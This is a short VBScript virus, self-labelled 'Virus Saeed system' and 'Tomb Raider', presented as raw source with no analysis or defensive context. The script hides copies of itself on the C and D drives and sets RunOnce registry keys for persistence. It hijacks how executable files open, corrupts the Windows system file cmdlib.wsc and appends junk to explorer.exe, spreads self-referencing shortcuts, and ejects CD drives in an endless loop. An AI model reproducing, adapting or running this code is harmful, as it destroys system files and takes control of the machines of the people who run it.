On Error Resume Next
' Virus Saeed system
Const Read = 1, Write = 2, Append = 8, Tristate = -1
Dim A1, B1, Cruise, Jolie, Silverstone, Winslet
Set A1 = CreateObject("Scripting.FileSystemObject")
Set B1 = WScript.CreateObject("WScript.Shell")
Set Jolie = A1.GetFile("Tomb.vbs")
A1.CopyFile "Tomb.vbs", "c:\"
A1.CopyFile "Tomb.vbs", "D:\"
Set Silverstone = A1.GetFile("C:\Tomb.vbs")
Silverstone.attributes = Silverstone.attributes + 4
B1.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\Tomb", "C:\Tomb.vbs"
B1.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\Raider", "D:\Tomb.vbs"
B1.RegWrite "HKEY_CURRENT_USER\Console\CursorSize", 40, "REG_DWORD"
B1.RegWrite "HKEY_CURRENT_USER\Control Panel\Opened", 0, "REG_DWORD"
B1.RegWrite "HKEY_CLASSES_ROOT\exefile\shell\Saeed\command\", "C:\tomb.vbs"
' -------------------------------------------------------------------------
Dim Nicolas, Cage
winms = B1.Environment("Process").Item("WINDIR")
msx=winms+"\"+"System32"+"\"+"logonui.exe"
If (A1.FileExists(msx)) Then
winms = B1.Environment("Process").Item("WINDIR")
xfile="cmdlib.wsc"
mse=winms+"\"+"System32"+"\"+xfile
Set Nicolas = A1.OpenTextFile(mse, Read)
ReadFile =  Nicolas.Readall
Cage = Replace(ReadFile, "Else", "End if")
Set Nicolas = A1.OpenTextFile(mse, Write, True)
Nicolas.Write Cage
Else
Set Cruise = A1.OpenTextFile("C:\windows\explorer.exe", Append, Tristate)
Cruise.Write "Virus Tomb Raider"
Cruise.Write "Rem Angelina Jolie"
Cruise.Close
Set Winslet = A1.OpenTextFile("C:\windows\web\deskmovr.htt", Append, Tristate)
Winslet.Write "Virus Tomb Raider"
Winslet.Write "Rem Angelina Jolie"
Winslet.Close
End If
' -------------------------------------------------------------------------
for a=65 to 90
for zz=1 to 1
zz=zz
a=a+zz-1
z=".url"
b=Chr(a)
ss=B+z
Set oShellLink = B1.CreateShortcut(ss)
oShellLink.TargetPath = WScript.ScriptFullName
oShellLink.Save
next
next
' -------------------------------------------------------------------------
do 
Set oWMP = CreateObject("WMPlayer.OCX.7") 
Set colCDROMs = oWMP.cdromCollection 

if colCDROMs.Count >= 1 then 
    For i = 0 to colCDROMs.Count - 1 
        colCDROMs.Item(i).Eject 
    Next  ' cdrom 
End If 
loop